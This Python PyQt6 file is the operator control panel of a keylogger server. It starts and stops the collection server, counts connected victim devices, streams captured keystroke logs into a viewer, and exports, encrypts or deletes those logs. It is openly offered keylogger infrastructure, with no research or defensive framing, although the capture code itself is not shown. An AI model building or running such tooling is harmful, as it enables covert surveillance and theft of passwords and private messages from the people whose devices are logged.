"""
Keylogger Server Manager - Main Interface with Session ID and Connection Tracking
"""

import sys
import datetime
import json
import os
import socket
from PyQt6.QtWidgets import (
    QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QHBoxLayout,
    QTextEdit, QGridLayout, QGroupBox, QFileDialog, QMessageBox, QDialog
)
from PyQt6.QtCore import QTimer
from PyQt6.QtGui import QTextCursor

# Import utility functions and settings
import utils
from settings import SettingsWindow, DEFAULT_SETTINGS

# Configuration
SERVER_SCRIPT = "server.py"
SETTINGS_FILE = "settings.json"


class KeyloggerServerGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Keylogger Server Manager")
        self.setGeometry(100, 100, 900, 600)
        
        # State
        self.server_process = None
        self.server_running = False
        self.start_time = None
        self.last_log_size = 0
        self.session_id = None  # Track current session ID
        
        # Connection stats - only active connections
        self.active_connections = 0
        
        # Load settings
        self.settings = self.load_settings_from_file()
        
        # Auto-stop timer
        self.auto_stop_timer = None
        
        # Setup UI
        self.layout = QVBoxLayout()
        self.setLayout(self.layout)
        
        self.create_header()
        self.create_status_cards()
        self.create_controls()
        self.create_logs_area()
        self.create_log_buttons()
        
        # Timers
        self.uptime_timer = QTimer()
        self.uptime_timer.timeout.connect(self.update_uptime)
        self.uptime_timer.start(1000)
        
        self.log_timer = QTimer()
        self.log_timer.timeout.connect(self.load_logs)
        self.log_timer.start(2000)
        
        # Stats timer (fetch connection stats every 3 seconds when server is running)
        self.stats_timer = QTimer()
        self.stats_timer.timeout.connect(self.fetch_connection_stats)
        self.stats_timer.start(3000)
        
        # Styling
        self.apply_styles()

    def load_settings_from_file(self):
        """Load settings from file or return defaults."""
        if os.path.exists(SETTINGS_FILE):
            try:
                with open(SETTINGS_FILE, 'r') as f:
                    return json.load(f)
            except:
                pass
        return DEFAULT_SETTINGS.copy()
    
    def save_settings_to_file(self):
        """Save settings to file."""
        try:
            with open(SETTINGS_FILE, 'w') as f:
                json.dump(self.settings, f, indent=2)
        except Exception as e:
            print(f"Failed to save settings: {e}")

    def create_header(self):
        header = QHBoxLayout()
        title = QLabel("Keylogger Server")
        title.setStyleSheet("font-size: 24px; font-weight: bold;")
        subtitle = QLabel("Real-time monitoring dashboard")
        subtitle.setStyleSheet("color: gray; font-size: 14px;")
        header.addWidget(title)
        header.addWidget(subtitle)
        header.addStretch()
        
        # Add settings button
        settings_btn = QPushButton("⚙ Settings")
        settings_btn.clicked.connect(self.open_settings)
        header.addWidget(settings_btn)
        
        self.layout.addLayout(header)

    def create_status_cards(self):
        grid = QGridLayout()
        
        # Card 1
        self.server_status_label = QLabel("Offline")
        self.uptime_label = QLabel("00:00:00")
        self.port_label = QLabel(f"Port: {self.settings['server_port']}")
        self.session_id_label = QLabel("Session ID: —")
        
        card1 = QGroupBox("Main Server")
        v1 = QVBoxLayout()
        v1.addWidget(self.port_label)
        v1.addWidget(self.session_id_label)
        v1.addWidget(QLabel("Uptime:"))
        v1.addWidget(self.uptime_label)
        v1.addWidget(self.server_status_label)
        card1.setLayout(v1)
        grid.addWidget(card1, 0, 0)
        
        # Card 2 - Simplified to show only active connections
        self.active_connections_label = QLabel("0")
        card2 = QGroupBox("Active Devices")
        v2 = QVBoxLayout()
        v2.addWidget(QLabel("Connected:"))
        v2.addWidget(self.active_connections_label)
        card2.setLayout(v2)
        grid.addWidget(card2, 0, 1)
        
        # Card 3
        self.total_logs_label = QLabel("0")
        card3 = QGroupBox("Log Storage")
        v3 = QVBoxLayout()
        v3.addWidget(QLabel("Total Logs:"))
        v3.addWidget(self.total_logs_label)
        card3.setLayout(v3)
        grid.addWidget(card3, 0, 2)
        
        self.layout.addLayout(grid)

    def create_controls(self):
        h = QHBoxLayout()
        
        self.start_btn = QPushButton("Start Server")
        self.start_btn.clicked.connect(self.start_server)
        h.addWidget(self.start_btn)
        
        self.stop_btn = QPushButton("Stop Server")
        self.stop_btn.clicked.connect(self.stop_server)
        self.stop_btn.setEnabled(False)
        h.addWidget(self.stop_btn)
        
        self.layout.addLayout(h)

    def create_logs_area(self):
        self.logs_text = QTextEdit()
        self.logs_text.setReadOnly(True)
        self.layout.addWidget(self.logs_text)

    def create_log_buttons(self):
        h = QHBoxLayout()
        
        export_btn = QPushButton("Export Logs")
        export_btn.clicked.connect(self.export_logs)
        h.addWidget(export_btn)
        
        encrypt_btn = QPushButton("Encrypt Logs")
        encrypt_btn.clicked.connect(self.encrypt_logs)
        h.addWidget(encrypt_btn)
        
        delete_btn = QPushButton("Delete Logs")
        delete_btn.clicked.connect(self.delete_logs)
        h.addWidget(delete_btn)
        
        self.layout.addLayout(h)

    def apply_styles(self):
        """Apply dark mode stylesheet."""
        self.setStyleSheet("""
            QWidget {
                background-color: #2b2b2b;
                color: #f0f0f0;
                font-family: Arial;
                font-size: 12px;
            }
            QGroupBox {
                border: 1px solid #444;
                border-radius: 5px;
                margin-top: 10px;
            }
            QGroupBox:title {
                subcontrol-origin: margin;
                subcontrol-position: top center;
                padding: 0 3px;
                color: #ffffff;
                font-weight: bold;
            }
            QPushButton {
                background-color: #444;
                border: 1px solid #555;
                border-radius: 4px;
                padding: 5px;
                color: white;
            }
            QPushButton:hover {
                background-color: #666;
            }
            QTextEdit {
                background-color: #1e1e1e;
                color: #f0f0f0;
                border: 1px solid #444;
            }
            QLabel {
                color: #f0f0f0;
            }
        """)

    # ==================== CONNECTION STATS ====================
    
    def fetch_connection_stats(self):
        """Fetch connection statistics from server."""
        if not self.server_running:
            return
        
        try:
            # Connect to server and request stats
            s = socket.socket()
            s.settimeout(2)
            s.connect(("localhost", self.settings['server_port']))
            
            # Send stats request
            s.send(b'S')
            
            # Receive stats
            stats_data = s.recv(4096).decode('utf-8')
            s.close()
            
            # Parse stats
            stats = json.loads(stats_data)
            self.active_connections = stats.get('active_count', 0)
            
            # Update UI
            self.active_connections_label.setText(str(self.active_connections))
            
        except Exception as e:
            # Silently fail if server is not responding
            pass

    # ==================== SETTINGS ====================
    
    def open_settings(self):
        """Open settings dialog."""
        dialog = SettingsWindow(self, self.settings.copy())
        if dialog.exec() == QDialog.DialogCode.Accepted:
            self.settings = dialog.settings
            self.save_settings_to_file()
            
            # Update port label
            self.port_label.setText(f"Port: {self.settings['server_port']}")
            
            QMessageBox.information(self, "Settings Saved", 
                "Settings saved successfully!\nRestart server for changes to take effect.")

    # ==================== BUTTON HANDLERS ====================
    
    def start_server(self):
        # Generate new session ID
        self.session_id = utils.generate_session_id()
        
        # Start server with session ID as environment variable
        process, success, error = utils.start_server(SERVER_SCRIPT, self.session_id)
        
        if success:
            self.server_process = process
            self.server_running = True
            self.start_time = datetime.datetime.now()
            self.server_status_label.setText("Online")
            self.session_id_label.setText(f"Session: {self.session_id}")  # Show full ID now
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            
            # Reset connection counter
            self.active_connections = 0
            self.active_connections_label.setText("0")
            
            # Write session start to log
            self.write_session_log(f"=== SERVER SESSION STARTED: {self.session_id} ===")
            
            # Setup auto-stop if enabled
            if self.settings["auto_stop_enabled"]:
                self.auto_stop_timer = QTimer()
                self.auto_stop_timer.timeout.connect(self.auto_stop_server)
                self.auto_stop_timer.start(self.settings["auto_stop_minutes"] * 60 * 1000)
                print(f"Auto-stop enabled: {self.settings['auto_stop_minutes']} minutes")
        else:
            QMessageBox.critical(self, "Error", f"Failed to start: {error}")

    def write_session_log(self, message):
        """Write session info to log file."""
        log_file = self.settings["log_file_path"]
        try:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"[{timestamp}] {message}\n")
                f.write(f"{'='*60}\n\n")
        except Exception as e:
            print(f"Error writing session log: {e}")

    def auto_stop_server(self):
        """Automatically stop server after timeout."""
        if self.auto_stop_timer:
            self.auto_stop_timer.stop()
        
        self.stop_server()
        QMessageBox.information(self, "Auto Stop", 
            f"Server automatically stopped after {self.settings['auto_stop_minutes']} minutes.")

    def stop_server(self):
        if self.server_process:
            # Stop auto-stop timer if running
            if self.auto_stop_timer:
                self.auto_stop_timer.stop()
                self.auto_stop_timer = None
            
            # Write session end to log
            if self.session_id:
                self.write_session_log(f"=== SERVER SESSION ENDED: {self.session_id} ===")
            
            success, error = utils.stop_server(self.server_process)
            if success:
                self.server_process = None
                self.server_running = False
                self.server_status_label.setText("Offline")
                self.session_id_label.setText("Session ID: —")
                self.session_id = None
                self.start_btn.setEnabled(True)
                self.stop_btn.setEnabled(False)
                
                # Reset connection display
                self.active_connections_label.setText("0")
            else:
                QMessageBox.critical(self, "Error", f"Failed to stop: {error}")

    def update_uptime(self):
        if self.server_running:
            uptime = utils.get_uptime(self.start_time)
            self.uptime_label.setText(uptime)

    def load_logs(self):
        log_file = self.settings["log_file_path"]
        new_content, new_size = utils.read_new_logs(log_file, self.last_log_size)
        self.last_log_size = new_size
        
        if new_content:
            cursor = self.logs_text.textCursor()
            at_bottom = cursor.atEnd()
            
            self.logs_text.moveCursor(QTextCursor.MoveOperation.End)
            self.logs_text.insertPlainText(new_content)
            
            if at_bottom:
                self.logs_text.moveCursor(QTextCursor.MoveOperation.End)
            
            count = utils.get_log_count(log_file)
            self.total_logs_label.setText(str(count))

    def export_logs(self):
        log_file = self.settings["log_file_path"]
        
        # Use default folder and format if set
        default_format = self.settings.get("default_export_format", "txt")
        default_filename = f"logs.{default_format}"
        
        if self.settings["default_export_folder"]:
            default_path = os.path.join(self.settings["default_export_folder"], default_filename)
        else:
            default_path = default_filename
        
        path, _ = QFileDialog.getSaveFileName(
            self, "Export Logs", default_path,
            "Text Files (*.txt);;CSV Files (*.csv);;JSON Files (*.json)"
        )
        
        if not path:
            return
        
        # Read full content
        content, _ = utils.read_new_logs(log_file, 0)
        if not content:
            QMessageBox.warning(self, "Error", "No logs to export")
            return
        
        success = False
        try:
            if path.endswith('.csv'):
                rows = utils.parse_logs_for_csv(content)
                success, error = utils.export_to_csv(rows, path)
            elif path.endswith('.json'):
                sessions = utils.parse_logs_for_json(content)
                success, error = utils.export_to_json(sessions, path)
            else:
                success, error = utils.export_to_txt(content, path)
            
            if success:
                QMessageBox.information(self, "Success", "Logs exported!")
            else:
                QMessageBox.critical(self, "Error", f"Export failed: {error}")
        except Exception as e:
            QMessageBox.critical(self, "Error", str(e))

    def encrypt_logs(self):
        log_file = self.settings["log_file_path"]
        success, error = utils.encrypt_logs(log_file)
        if success:
            QMessageBox.information(self, "Success", 
                "Encrypted!\nFiles: logs.encrypted + logs.key")
        else:
            QMessageBox.critical(self, "Error", f"Failed: {error}")

    def delete_logs(self):
        reply = QMessageBox.question(self, "Confirm", 
            "Delete all logs?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        
        if reply == QMessageBox.StandardButton.Yes:
            log_file = self.settings["log_file_path"]
            success, error = utils.clear_logs(log_file)
            if success:
                self.logs_text.clear()
                self.total_logs_label.setText("0")
                self.last_log_size = 0
                QMessageBox.information(self, "Success", "Logs deleted!")
            else:
                QMessageBox.critical(self, "Error", f"Failed: {error}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = KeyloggerServerGUI()
    window.show()
    sys.exit(app.exec())